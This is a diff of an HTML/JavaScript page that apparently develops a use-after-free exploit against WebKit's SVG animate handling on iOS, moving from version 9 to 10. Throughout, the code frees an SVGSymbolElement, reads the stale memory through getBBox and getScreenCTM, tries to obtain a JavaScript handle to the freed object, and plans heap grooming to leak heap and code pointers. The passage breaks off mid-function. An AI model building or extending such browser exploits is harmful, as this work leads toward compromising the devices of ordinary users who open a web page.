@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG animate UAF v9 · robust setup + sym1 freed slot spray</title>
+<title>SVG animate UAF v10 · memory layout probe + ptr leak</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -14,26 +14,25 @@ button:hover:not(:disabled){border-color:#00ff41}
 button:disabled{opacity:.3}
 #log{font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}
 .ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.hi{color:#00cfff}.dim{color:#444}.sep{color:#222}
-/* SVG stage — VISIBLE on screen, no opacity tricks */
 #stage{position:fixed;top:10px;right:10px;width:220px;height:220px;background:#111;border:1px solid #222;z-index:9999;overflow:hidden}
 </style>
 </head>
 <body>
-<h2>SVG animate UAF v9 · robust setup + sym1 freed slot spray · iOS 26.5.2</h2>
+<h2>SVG animate UAF v10 · memory layout scanner · iOS 26.5.2 · A16</h2>
 <div class="sub">
-  v8 FAIL: setup() returned cached=false 100% → animation never fired.
-  Root cause: opacity:0.01 / off-screen → WebKit skips rendering → animation never caches.
-  v9 FIX: SVG fully visible (on-screen, opacity:1) + rAF-based setup + 500ms max wait.
-  Strategy unchanged: sym1.remove() → SVGSymbolElement freed → spray sentinel → read stale.
+  v9 CONFIRMED: 0x42a00000 (80.0f) = raw freed SVGSymbolElement bytes read through stale ptr.
+  Spray not needed — direct freed memory read is happening.
+  v10 goal: decode memory layout, find ptr fields, leak heap/text addresses.
+  Key: getBBox width comes from SVGSymbolElement geometry — map which offset that is.
+  Then use targetElement / href to read pointer-sized fields from freed slot.
 </div>
-<!-- VISIBLE SVG stage — required for animation to fire on iOS -->
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runSS()">SS setup-verify</button>
-  <button onclick="runZW()">ZW zero-window spray</button>
-  <button onclick="runIM()">IM immediate read</button>
-  <button onclick="runCT()">CT controlled transition</button>
-  <button onclick="runDB()">DB dual removal</button>
+  <button onclick="runMB()">MB mem-baseline</button>
+  <button onclick="runTG()">TG targetElement</button>
+  <button onclick="runHR()">HR href-read</button>
+  <button onclick="runRP()">RP repeat-probe</button>
+  <button onclick="runSZ()">SZ size-class</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -41,30 +40,53 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * v9 KEY FIX: SVG MUST BE VISIBLE AND ON-SCREEN
+ * v9 FINDINGS:
+ *   - IM other=700: getBBox returns 80.0f (0x42a00000) after sym1.remove()
+ *     This is raw freed C++ object memory being read through stale SVGElement* ptr
+ *   - ZW hit=325: same value — spray didn't replace slot (different bmalloc size class)
+ *   - CT hit=12: same 80.0f — consistent freed memory read
+ *   - CONCLUSION: direct UAF read of freed SVGSymbolElement C++ object is WORKING
  *
- * WebKit/Safari optimization: if an SVG element is:
- *   - opacity: 0.01 (below render threshold)
- *   - position: fixed; left: -9999px (off-screen)
- *   - display: none or visibility: hidden
- * Then WebKit skips rendering entirely. Animations don't fire.
- * getBBox() still returns geometry (from cached layout) but animation
- * cache never gets populated because the animate element never runs.
+ * v10 GOAL: extract useful data from the UAF read
  *
- * FIX: keep a visible SVG on-screen. The #stage div holds livesvg,
- * which is always visible. We share one global SVG for UAF tests.
+ * APPROACH 1: targetElement probe
+ *   SVGAnimateElement.targetElement returns the cached SVGElement* as a JS object wrapper
+ *   After sym1.remove(), this might:
+ *     a) return null (ptr cleared — means WebKit nulls animation cache on remove)
+ *     b) return sym1 (live ref kept — RefCount didn't drop)
+ *     c) return a wrapper around freed memory (USE-AFTER-FREE JS handle!)
+ *     d) crash
+ *   If (c): we have a JS object wrapping a freed C++ ptr → can call methods on it
  *
- * SETUP STRATEGY (rAF-based):
- *   Add sym1, sym2, useEl+anim to visible livesvg.
- *   Wait for requestAnimationFrame (actual render tick, not setTimeout).
- *   Read getBBox. If > 100: animation fired and cached sym1 ptr.
- *   Retry up to 10 rAF ticks (should fire within 3 on 60fps device,
- *   within 8 on throttled 15fps device).
+ * APPROACH 2: href.baseVal read
+ *   animate.href.baseVal reads WTF::String from the animate element
+ *   After sym1 freed: try reading href on a use element pointing at sym1
+ *   WTF::String has: m_impl ptr (8B), length field
+ *   If we can get any string data back from freed memory → heap ptr leak
  *
- * ALSO: set animation dur='0.016s' (1 frame at 60fps) for faster cycling.
- * The animation doesn't need to be slow — we just need it to fire once.
+ * APPROACH 3: repeat stable read
+ *   0x42a00000 is suspiciously stable — appears across trials
+ *   This might be a REFCOUNT FIELD (refcount=2 before remove, decremented to some value)
+ *   Or a TYPE TAG / VTABLE OFFSET that is consistent across allocations
+ *   Need to understand: does the value change between trials? Between page reloads?
  *
- * TEARDOWN: after test, clear livesvg, wait 2 rAF, then next test.
+ * APPROACH 4: size class alignment
+ *   SVGSymbolElement estimated ~368B → bmalloc 384B size class
+ *   Our spray syms are the SAME type — should go to SAME class
+ *   But spray hits LIFO magazine → allocated syms go to fresh slots, not freed one
+ *   Problem: after sym1.remove(), the freed slot might be reclaimed by WebKit GC
+ *             before we can spray into it
+ *   Solution: force bmalloc to NOT reclaim — allocate many OTHER objects first
+ *             to exhaust the magazine, then spray sym-sized objects
+ *
+ * APPROACH 5: multi-read scan
+ *   Instead of just getBBox().width, also read:
+ *     - getBBox().height
+ *     - getBBox().x
+ *     - getBBox().y
+ *     - getScreenCTM() matrix entries (6 floats)
+ *   Each reads a different float from the freed C++ layout
+ *   Collecting all 4+6=10 floats per trial = 10 float reads of freed memory
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -73,7 +95,6 @@ const livesvg=document.getElementById('livesvg');
 function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';Lel.appendChild(s);Lel.scrollTop=Lel.scrollHeight;}
 const sep=()=>log('─'.repeat(52),'sep');
 const raf=()=>new Promise(r=>requestAnimationFrame(r));
-const yield_=()=>new Promise(r=>setTimeout(r,0));
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 function copyLog(){try{navigator.clipboard.writeText(Lel.innerText);}catch(e){const a=document.createElement('textarea');a.value=Lel.innerText;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
 function clearLog(){Lel.innerHTML='';}
@@ -83,15 +104,10 @@ window.onunhandledrejection=e=>{log(`[CRASH/rej] ${e.reason}`,'bad');};
 
 function f2h(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
 function f2u(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return new Uint32Array(b)[0];}
-function isPtrLike(u){return (u>>>24)<=0x02&&u>0x1000;}
-function isBaseline(w){return Math.abs(w-150)<0.5;}
-function isSym2(w){return Math.abs(w-180)<0.5;}
-function isSentA(w){return Math.abs(w-198)<0.5;}
-function isSentB(w){return Math.abs(w-100)<0.5;}
-function isWild(w){return w!==0&&!isBaseline(w)&&!isSym2(w)&&!isSentA(w)&&!isSentB(w);}
+function d2h(d){const b=new ArrayBuffer(8);new Float64Array(b)[0]=d;const u=new Uint32Array(b);return'0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');}
+function isPtrLike32(u){return (u>>>24)<=0x02&&u>0x10000;}
+function isPtrLike(f){const u=f2u(f);return isPtrLike32(u);}
 
-// ── SVGSymbolElement construction ─────────────────────────────────────
-// sym1 (VICTIM): 4 rects x=0,20,40,60 w=15 → union width=75 → viewport=150
 function mkSym1(id){
     const sym=document.createElementNS(SVG_NS,'symbol');
     sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
@@ -103,7 +119,6 @@ function mkSym1(id){
     }
     return sym;
 }
-// sym2 (LIVE): rect x=10 w=80 → viewport=160 (animation will cycle here)
 function mkSym2(id){
     const sym=document.createElementNS(SVG_NS,'symbol');
     sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
@@ -112,289 +127,502 @@ function mkSym2(id){
     sym.appendChild(r);
     return sym;
 }
-// SENTINEL A: rect x=0 w=99 → viewport=198 — if getBBox=198: UAF read confirmed
-function mkSentA(id){
-    const sym=document.createElementNS(SVG_NS,'symbol');
-    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
-    const r=document.createElementNS(SVG_NS,'rect');
-    r.setAttribute('x','0');r.setAttribute('y','0');r.setAttribute('width','99');r.setAttribute('height','99');
-    sym.appendChild(r);
-    return sym;
-}
 
-// ── SETUP (rAF-based, visible SVG) ───────────────────────────────────
-// clears livesvg, adds sym1+sym2+useEl, waits for animation to fire
 async function setup(id){
-    // Clear previous test elements
     while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-    await raf();await raf();// let render settle
-
+    await raf();await raf();
     const sym1=mkSym1(`${id}_s1`);
     const sym2=mkSym2(`${id}_s2`);
     livesvg.appendChild(sym1);
     livesvg.appendChild(sym2);
-
     const useEl=document.createElementNS(SVG_NS,'use');
     useEl.setAttribute('href',`#${id}_s1`);
     const anim=document.createElementNS(SVG_NS,'animate');
     anim.setAttribute('attributeName','href');
     anim.setAttribute('values',`#${id}_s1;#${id}_s2`);
-    // Short duration → animation fires quickly → caches sym1 ptr fast
     anim.setAttribute('dur','0.1s');
     anim.setAttribute('repeatCount','indefinite');
     useEl.appendChild(anim);
     livesvg.appendChild(useEl);
-
-    // Wait for animation to cache sym1 ptr using rAF (actual render tick)
-    let cached=false;let bbPre=null;let attempts=0;
+    let cached=false,bbPre=null,attempts=0;
     while(!cached&&attempts<20){
-        await raf();
-        attempts++;
-        try{
-            const bb=useEl.getBBox();
-            if(bb.width>10){// any non-trivial geometry = animation fired
-                cached=true;bbPre=bb;
-            }
-        }catch(e){}
+        await raf();attempts++;
+        try{const bb=useEl.getBBox();if(bb.width>10){cached=true;bbPre=bb;}}catch(e){}
     }
     return{useEl,anim,sym1,sym2,cached,bbPre,attempts};
 }
-
-// cleanup after each test
 async function teardown(){
     while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
     await raf();await raf();
 }
 
-// ── SS: setup verification ────────────────────────────────────────────
-async function runSS(q=false){
-    if(!q){dis(true);sep();log('▶ SS: setup verify — rAF-based animation cache test','inf');sep();}
-    log('[*] testing visible SVG setup with rAF polling','inf');
-    log('[*] expected: getBBox=150 (sym1 baseline) within 20 rAF ticks','inf');
-    let ok=0,fail=0,totalAttempts=0;
-    for(let t=0;t<16;t++){
-        const{useEl,sym1,sym2,cached,bbPre,attempts}=await setup(`ss_${t}`);
-        totalAttempts+=attempts;
-        if(cached){
-            ok++;
-            if(t<8)log(`  t${t}: cached after ${attempts} rAF ticks — getBBox=${bbPre.width.toFixed(2)}`,'ok');
+// ── MB: multi-field memory baseline ──────────────────────────────────────
+// Before AND after sym1.remove(), read ALL getBBox fields + CTM matrix
+// This gives us multiple float reads from the freed C++ object memory
+async function runMB(q=false){
+    if(!q){dis(true);sep();log('▶ MB: multi-field read — getBBox + getScreenCTM floats from freed memory','inf');sep();}
+    log('[*] reading width/height/x/y from getBBox + a/b/c/d/e/f from getScreenCTM','inf');
+    log('[*] each field reads a DIFFERENT offset in the freed SVGSymbolElement C++ obj','inf');
+    log('[*] non-zero non-geometry = raw freed bytes at that offset','ok');
+    log('');
+
+    const allReads=[];
+
+    for(let t=0;t<8;t++){
+        const{useEl,sym1,sym2,cached,bbPre}=await setup(`mb_${t}`);
+        if(!cached){log(`  t${t}: no cache`,'bad');await teardown();continue;}
+
+        // PRE-FREE reads (baseline)
+        let preW=0,preH=0,preX=0,preY=0;
+        try{const bb=useEl.getBBox();preW=bb.width;preH=bb.height;preX=bb.x;preY=bb.y;}catch(e){}
+
+        // FREE sym1
+        sym1.remove();
+
+        // POST-FREE reads — multiple fields
+        const reads={w:[],h:[],x:[],y:[],ctm_a:[],ctm_b:[],ctm_c:[],ctm_d:[],ctm_e:[],ctm_f:[]};
+        for(let p=0;p<5;p++){
+            try{
+                const bb=useEl.getBBox();
+                reads.w.push(bb.width);
+                reads.h.push(bb.height);
+                reads.x.push(bb.x);
+                reads.y.push(bb.y);
+            }catch(e){reads.w.push(-1);}
+            try{
+                const m=useEl.getScreenCTM();
+                if(m){
+                    reads.ctm_a.push(m.a);
+                    reads.ctm_b.push(m.b);
+                    reads.ctm_c.push(m.c);
+                    reads.ctm_d.push(m.d);
+                    reads.ctm_e.push(m.e);
+                    reads.ctm_f.push(m.f);
+                }
+            }catch(e){}
+        }
+
+        // Log distinct non-zero non-geometry values
+        const fields=['w','h','x','y','ctm_a','ctm_b','ctm_c','ctm_d','ctm_e','ctm_f'];
+        let interesting=false;
+        const row={t, pre:{w:preW,h:preH,x:preX,y:preY}, post:{}};
+        for(const f of fields){
+            const vals=reads[f].filter(v=>v!==-1);
+            if(!vals.length)continue;
+            const uniq=[...new Set(vals.map(v=>v.toFixed(4)))];
+            const v=vals[0];
+            const u=f2u(v);
+            const isGeo=(Math.abs(v-150)<1||Math.abs(v-160)<1||Math.abs(v-75)<1||Math.abs(v-80)<1||Math.abs(v-10)<1||v===0);
+            row.post[f]=uniq[0];
+            if(!isGeo&&v!==0&&v!==-1){interesting=true;}
+        }
+
+        if(interesting){
+            log(`  t${t}: [pre w=${preW.toFixed(1)} h=${preH.toFixed(1)}]`,'ok');
+            for(const f of fields){
+                const vals=reads[f].filter(v=>v!==-1);
+                if(!vals.length)continue;
+                const v=vals[0];
+                const u=f2u(v);
+                const isGeo=(Math.abs(v-150)<1||Math.abs(v-160)<1||Math.abs(v-75)<1||Math.abs(v-80)<1||Math.abs(v-10)<1||v===0);
+                const cls=isPtrLike(v)?'bad':(!isGeo?'hi':'dim');
+                if(cls!=='dim'||f==='w'){
+                    log(`    ${f.padEnd(6)}: ${v.toFixed(4).padStart(12)} (${f2h(v)})${isPtrLike32(u)?' ← PTR?':''}`,cls);
+                }
+            }
         }else{
-            fail++;
-            log(`  t${t}: NOT CACHED after 20 rAF ticks — setup failed`,'bad');
+            log(`  t${t}: pre w=${preW.toFixed(1)}, post all-zero or baseline`,'dim');
         }
+
+        allReads.push(row);
         await teardown();
     }
-    log(`\n[*] SS: ok=${ok} fail=${fail} avg_attempts=${(totalAttempts/16).toFixed(1)}`,
-        (fail===0?'ok':ok>8?'inf':'bad'));
-    if(fail>0&&ok===0)log('[!] animation still not firing — check if device throttling animations','bad');
-    if(!q)dis(false);return{ok,fail};
+
+    // Aggregate: which fields consistently have non-zero non-geometry values?
+    log('\n[*] MB summary — consistent non-geometry values per field:','inf');
+    const fieldSummary={};
+    for(const r of allReads){
+        for(const[f,v]of Object.entries(r.post)){
+            if(!fieldSummary[f])fieldSummary[f]=[];
+            fieldSummary[f].push(v);
+        }
+    }
+    for(const[f,vals]of Object.entries(fieldSummary)){
+        const uniq=[...new Set(vals)];
+        log(`  ${f.padEnd(6)}: [${uniq.slice(0,4).join(', ')}]`,'inf');
+    }
+
+    if(!q)dis(false);return allReads;
 }
 
-// ── IM: immediate read after sym1.remove() ────────────────────────────
-async function runIM(q=false){
-    if(!q){dis(true);sep();log('▶ IM: immediate read — getBBox immediately after sym1.remove()','inf');sep();}
-    log('[*] sym1.remove() → tight 100× getBBox loop — no spray, raw freed bytes','inf');
-    log('[*] 0 = freed slot zeroed OR renderer null; 150 = render still alive','inf');
-    log('[*] non-{0,150,180} = raw freed C++ bytes from SVGSymbolElement!','ok');
+// ── TG: targetElement probe ───────────────────────────────────────────────
+// Read anim.targetElement before and after sym1.remove()
+// If we get a non-null JS obj after free: we have a JS handle to freed C++ memory
+async function runTG(q=false){
+    if(!q){dis(true);sep();log('▶ TG: targetElement probe — read anim cache ptr as JS object','inf');sep();}
+    log('[*] animate.targetElement returns the cached SVGElement* as JS wrapper','inf');
+    log('[*] after sym1.remove(): null=ptr cleared, obj=wrapper around freed ptr!','ok');
+    log('[*] if non-null after free: call getBBox on that wrapper → direct read','ok');
     log('');
-    const buckets={zero:0,baseline:0,sym2:0,other:0,crash:0};
-    const others=[];
+
+    let nullCount=0,liveCount=0,freedCount=0,crashCount=0;
+
     for(let t=0;t<16;t++){
-        const{useEl,sym1,sym2,cached,bbPre}=await setup(`im_${t}`);
-        if(!cached){log(`  t${t}: not cached`,'bad');await teardown();continue;}
-        // Verify exact baseline
-        const bPre=bbPre.width;
-        sym1.remove(); // ← FREE THE DOM OBJ — stale SVGElement* in anim cache
-        const reads=[];
-        for(let p=0;p<100;p++){
-            try{const bb=useEl.getBBox();reads.push(bb.width);}
-            catch(e){reads.push(-1);buckets.crash++;break;}
+        const{useEl,anim,sym1,sym2,cached,bbPre}=await setup(`tg_${t}`);
+        if(!cached){log(`  t${t}: no cache`,'bad');await teardown();continue;}
+
+        // Pre-free: targetElement should be sym1
+        let preTgt=null;
+        try{preTgt=anim.targetElement;}catch(e){log(`  t${t}: pre targetElement crashed: ${e}`,'bad');}
+
+        // FREE
+        sym1.remove();
+
+        // Post-free: what does targetElement return?
+        let postTgt=null,postErr=null;
+        try{postTgt=anim.targetElement;}catch(e){postErr=String(e);crashCount++;}
+
+        let bbAfter=null,bbErr=null;
+        if(postTgt!==null&&postTgt!==undefined){
+            // Got a JS obj! Try calling getBBox on it
+            try{bbAfter=postTgt.getBBox();}catch(e){bbErr=String(e);}
         }
-        for(const w of reads){
-            if(w<0)break;
-            if(w===0)buckets.zero++;
-            else if(isBaseline(w))buckets.baseline++;
-            else if(isSym2(w)||Math.abs(w-160)<0.5)buckets.sym2++;
-            else{buckets.other++;others.push({t,w,hex:f2h(w)});}
+
+        const preSame=(preTgt===sym1);
+        const postNull=(postTgt===null||postTgt===undefined);
+        const postIsSym1=(postTgt===sym1);
+        const postIsSym2=(postTgt===sym2);
+
+        if(postErr){
+            log(`  t${t}: pre=${preSame?'sym1':'other'} → CRASH: ${postErr.slice(0,60)}`,'bad');
+        }else if(postNull){
+            nullCount++;
+            if(t<4)log(`  t${t}: pre=${preSame?'sym1':'?'} → null (ptr cleared on remove)`,'dim');
+        }else if(postIsSym1){
+            liveCount++;
+            log(`  t${t}: pre=sym1 → STILL SYM1 (live ref kept — renderer alive?)`,'inf');
+            if(bbAfter)log(`    getBBox on tgt after free: w=${bbAfter.width.toFixed(4)} h=${bbAfter.height.toFixed(4)}`,'ok');
+        }else if(postIsSym2){
+            log(`  t${t}: → sym2 (animation cycled?)`,'dim');
+        }else{
+            // Non-null, not sym1, not sym2 — could be freed ptr wrapper!
+            freedCount++;
+            const tagName=(()=>{try{return postTgt.tagName}catch(e){return`[err:${e}]`}})();
+            log(`  t${t}: → UNEXPECTED OBJ! tagName=${tagName}${ bbAfter?` getBBox.w=${bbAfter.width.toFixed(4)}`:''}${bbErr?` bbErr=${bbErr.slice(0,40)}`:''}`, 'ok');
         }
-        const seq=reads.slice(0,15).map(w=>{
-            if(w<0)return'X';if(w===0)return'0';
-            if(isBaseline(w))return'B';if(isSym2(w)||Math.abs(w-160)<0.5)return'S2';
-            return`?${w.toFixed(0)}`;
-        }).join('');
-        const hasOther=reads.some(w=>w>=0&&!isBaseline(w)&&!isSym2(w)&&w!==0&&Math.abs(w-160)>0.5);
-        log(`  t${t}: [pre=${bPre.toFixed(1)}] ${seq}${reads.length>15?'...':''}`,hasOther?'ok':'dim');
+
+        // Also: try reading properties on sym1 AFTER it's been removed
+        // If sym1 is still accessible as a JS ref, it's a retained zombie
+        let zombieCheck=null;
+        try{zombieCheck=sym1.getBBox();}catch(e){}
+        if(zombieCheck&&Math.abs(zombieCheck.width-150)>1){
+            log(`  t${t}: zombie sym1 getBBox=${zombieCheck.width.toFixed(4)} (${f2h(zombieCheck.width)})`,'hi');
+        }
+
         await teardown();
     }
-    log(`\n[*] IM: zero=${buckets.zero} baseline=${buckets.baseline} sym2=${buckets.sym2} other=${buckets.other} crash=${buckets.crash}`,
-        (buckets.other>0||buckets.crash>0?'ok':'inf'));
-    if(others.length>0){
-        log('[+] RAW FREED BYTES:','ok');
-        for(const o of others.slice(0,10))log(`  t=${o.t} w=${o.w.toFixed(4)} (${o.hex})`,'hi');
-    }
-    if(buckets.zero>0)log('[*] ZERO results: bmalloc zeroes freed slot OR renderer null ptr read','inf');
-    if(buckets.baseline>0)log('[*] BASELINE after removal: render tree still alive despite sym1 removal!','inf');
-    if(!q)dis(false);return buckets;
+
+    log(`\n[*] TG: null=${nullCount} live=${liveCount} freed=${freedCount} crash=${crashCount}`,
+        (freedCount>0||liveCount>0)?'ok':'inf');
+    if(liveCount>0)log('[+] SYM1 STILL ACCESSIBLE AFTER REMOVE — live zombie ref!','ok');
+    if(freedCount>0)log('[+] FREED PTR WRAPPER — call methods on freed C++ object from JS!','bad');
+
+    if(!q)dis(false);
+    return{nullCount,liveCount,freedCount,crashCount};
 }
 
-// ── ZW: zero-window spray ─────────────────────────────────────────────
-async function runZW(q=false){
-    if(!q){dis(true);sep();log('▶ ZW: zero-window spray — sym1.remove() + immediate sentinel spray','inf');sep();}
-    log('[*] sentinel A: SVGSymbol w=99 → getBBox=198 if spray captured freed slot','inf');
-    log('[*] spray 2048 sentinel syms SYNCHRONOUSLY after sym1.remove()','inf');
+// ── HR: href string read ──────────────────────────────────────────────────
+// Read useEl.href.baseVal and animateTo string fields after sym1 freed
+// WTF::String stores a pointer+length; if we can read string fields from freed slot...
+async function runHR(q=false){
+    if(!q){dis(true);sep();log('▶ HR: href / string field read after sym1 freed','inf');sep();}
+    log('[*] reading string-related properties on use/animate after sym1 removed','inf');
+    log('[*] looking for any non-default string data from freed slot','ok');
     log('');
-    let hit=0,crash=0,zero=0;
-    // Use a SEPARATE SVG for spray (not livesvg — livesvg holds the UAF setup)
-    const svgSp=document.createElementNS(SVG_NS,'svg');
-    svgSp.setAttribute('width','1');svgSp.setAttribute('height','1');
-    svgSp.style.cssText='position:fixed;top:5px;left:5px;width:1px;height:1px;opacity:1';
-    document.body.appendChild(svgSp);
+
+    let hitCount=0;
+
+    for(let t=0;t<12;t++){
+        const{useEl,anim,sym1,sym2,cached}=await setup(`hr_${t}`);
+        if(!cached){await teardown();continue;}
+
+        // Pre: record baseline href values
+        const preHref=(()=>{try{return useEl.href.baseVal}catch(e){return null}})();
+        const preAnimHref=(()=>{try{return anim.href.baseVal}catch(e){return null}})();
+        const preAttr=useEl.getAttribute('href');
+
+        // FREE
+        sym1.remove();
+
+        // Post-free string reads
+        const results={};
+
+        // 1. useEl.href — SVGAnimatedString pointing to #sym1_s1
+        try{results.useHref=useEl.href.baseVal;}catch(e){results.useHrefErr=String(e);}
+        try{results.useHrefAnim=useEl.href.animVal;}catch(e){}
+
+        // 2. anim.href — SVGAnimatedString for the animate element
+        try{results.animHref=anim.href.baseVal;}catch(e){results.animHrefErr=String(e);}
+
+        // 3. getAttribute still works (DOM attr, not C++ field)
+        try{results.attr=useEl.getAttribute('href');}catch(e){}
+
+        // 4. Try to read currentHref / from / to
+        try{results.animFrom=(()=>{const a=anim.getAttribute('values');return a?a.split(';')[0]:null})();}catch(e){}
+
+        // 5. The animate element has 'values' — reading it after sym1 freed
+        // won't leak ptr (it's the anim element, not the freed sym)
+        // But: check if ANY string property on useEl returns unexpected data
+        try{
+            const id=sym1.id; // reading id on freed obj? (sym1 JS ref still valid)
+            if(id&&id!==`hr_${t}_s1`)results.sym1IdWeird=id;
+        }catch(e){}
+
+        // 6. The key test: sym1 is freed C++ obj. We still hold a JS ref (sym1 var).
+        // Can we read properties FROM sym1 after it's freed?
+        let sym1PostReads={};
+        for(const prop of['id','tagName','localName']){
+            try{sym1PostReads[prop]=sym1[prop];}catch(e){sym1PostReads[prop]=`[crash:${e}]`;}
+        }
+        // Try to read getBBox on the freed sym1 (not through useEl, but directly)
+        try{
+            const bb=sym1.getBBox();
+            sym1PostReads.getBBox_w=bb.width.toFixed(4);
+            sym1PostReads.getBBox_h=bb.height.toFixed(4);
+            sym1PostReads.getBBox_x=bb.x.toFixed(4);
+            sym1PostReads.getBBox_y=bb.y.toFixed(4);
+        }catch(e){sym1PostReads.getBBox_err=String(e);}
+
+        // Check for anything interesting
+        let interesting=false;
+        if(sym1PostReads.getBBox_w){
+            const w=parseFloat(sym1PostReads.getBBox_w);
+            if(Math.abs(w-75)>1)interesting=true; // 75 = expected for sym1 pre-free
+        }
+
+        if(interesting||t<3){
+            log(`  t${t}: sym1 post-free reads:`, interesting?'ok':'dim');
+            log(`    getBBox: w=${sym1PostReads.getBBox_w||'?'} h=${sym1PostReads.getBBox_h||'?'} x=${sym1PostReads.getBBox_x||'?'} y=${sym1PostReads.getBBox_y||'?'}`,
+                interesting?'hi':'dim');
+            if(sym1PostReads.getBBox_err)log(`    getBBox err: ${sym1PostReads.getBBox_err.slice(0,60)}`,'bad');
+            if(sym1PostReads.id)log(`    id=${sym1PostReads.id} tagName=${sym1PostReads.tagName}`,'dim');
+            if(interesting)hitCount++;
+        }
+
+        await teardown();
+    }
+
+    log(`\n[*] HR: hit=${hitCount}`,(hitCount>0?'ok':'dim'));
+    log('[*] note: sym1 JS ref may keep C++ obj alive via RefCount — prevents true free','inf');
+    log('[*] CRITICAL: if sym1 reads return non-geometry values: true freed memory read','ok');
+
+    if(!q)dis(false);
+    return{hitCount};
+}
+
+// ── RP: repeat stable probe — map which field gives 0x42a00000 ─────────────
+// v9 showed consistent 80.0f (0x42a00000) from getBBox.width
+// This test: repeat many reads to confirm stability + map all fields systematically
+// Also test: does useEl.getBBox() vs sym1.getBBox() give different results?
+async function runRP(q=false){
+    if(!q){dis(true);sep();log('▶ RP: repeat stable probe — confirm 80.0f and map field offsets','inf');sep();}
+    log('[*] comparing useEl.getBBox vs sym1.getBBox after sym1.remove()','inf');
+    log('[*] 80.0f = 0x42a00000 is stable — figuring out what C++ field this is','ok');
+    log('');
+
+    const hexFreq={};
+    let totalReads=0;
 
     for(let t=0;t<16;t++){
-        const{useEl,sym1,sym2,cached}=await setup(`zw_${t}`);
-        if(!cached){log(`  t${t}: setup failed`,'bad');await teardown();continue;}
-        const bPre=useEl.getBBox().width;
-        sym1.remove(); // ← freed
-        // IMMEDIATE SYNC SPRAY into separate SVG (same document, same bmalloc heap)
-        const spray=[];
-        for(let i=0;i<2048;i++){
-            const s=mkSentA(`zw_s_${t}_${i}`);
-            svgSp.appendChild(s);spray.push(s);
+        const{useEl,anim,sym1,sym2,cached,bbPre}=await setup(`rp_${t}`);
+        if(!cached){await teardown();continue;}
+        const preW=bbPre.width;
+
+        sym1.remove();
+
+        // Multi-read after free — both through useEl (stale ptr) and sym1 JS ref
+        const useReads=[],sym1Reads=[];
+        for(let p=0;p<20;p++){
+            try{const bb=useEl.getBBox();useReads.push(bb.width);}catch(e){useReads.push(-1);}
         }
-        // Tight read loop
-        const reads=[];
-        for(let p=0;p<25;p++){
-            try{reads.push(useEl.getBBox().width);}
-            catch(e){reads.push(-1);crash++;log(`  [CRASH] t=${t} p=${p}: ${e}`,'hi');break;}
+        for(let p=0;p<5;p++){
+            try{const bb=sym1.getBBox();sym1Reads.push({w:bb.width,h:bb.height,x:bb.x,y:bb.y});}
+            catch(e){sym1Reads.push(null);}
         }
-        let found=false;
-        for(let p=0;p<reads.length;p++){
-            const w=reads[p];
-            if(w<0)break;
-            if(isSentA(w)){log(`  [HIT-A! 198] t=${t} p=${p} — spray captured freed SVGSymbolElement slot!`,'ok');hit++;found=true;}
-            else if(isSentB(w)){log(`  [HIT-B! 100] t=${t} p=${p}`,'ok');hit++;found=true;}
-            else if(w===0)zero++;
-            else if(isWild(w)&&!isSym2(w)&&Math.abs(w-160)>1){
-                log(`  [WILD! ${w.toFixed(2)}] t=${t} p=${p} hex=${f2h(w)} — non-geometry!`,'hi');hit++;found=true;
+
+        // Track hex values seen from useEl
+        for(const w of useReads){
+            if(w<0)continue;
+            const h=f2h(w);
+            hexFreq[h]=(hexFreq[h]||0)+1;
+            totalReads++;
+        }
+
+        const uniqUse=[...new Set(useReads.filter(v=>v>=0).map(v=>v.toFixed(2)))];
+        const sym1Valid=sym1Reads.filter(r=>r!==null);
+
+        if(t<8){
+            log(`  t${t}: pre=${preW.toFixed(1)} | useEl post: [${uniqUse.slice(0,4).join(',')}]`,'inf');
+            if(sym1Valid.length){
+                const r=sym1Valid[0];
+                log(`    sym1 direct post: w=${r.w.toFixed(4)} h=${r.h.toFixed(4)} x=${r.x.toFixed(4)} y=${r.y.toFixed(4)}`,'ok');
+                // Flag any non-geometry non-zero values
+                for(const[f,v]of Object.entries(r)){
+                    const u=f2u(v);
+                    if(v!==0&&Math.abs(v-75)>1&&Math.abs(v-15)>1&&Math.abs(v-10)>1){
+                        log(`    *** ${f}=${v.toFixed(6)} hex=${f2h(v)} ${isPtrLike32(u)?'← PTR CANDIDATE':'← raw freed byte'}`, 'hi');
+                    }
+                }
             }
         }
-        const seq=reads.slice(0,12).map(w=>{
-            if(w<0)return'X';if(w===0)return'0';if(isBaseline(w))return'B';
-            if(isSym2(w)||Math.abs(w-160)<0.5)return'S2';if(isSentA(w))return'A!';
-            return`?${w.toFixed(0)}`;
-        }).join('→');
-        if(!found&&t<6)log(`  t${t}: pre=${bPre.toFixed(1)} seq=${seq}`,'dim');
-        // clean spray
-        for(const s of spray)s.remove();spray.length=0;
+
         await teardown();
     }
-    // remove spray svg
-    svgSp.remove();
-    log(`\n[*] ZW: hit=${hit} zero=${zero} crash=${crash}`,(hit>0?'ok':zero>0?'inf':'bad'));
-    if(!q)dis(false);return{hit,zero,crash};
+
+    // Show frequency distribution of hex values seen
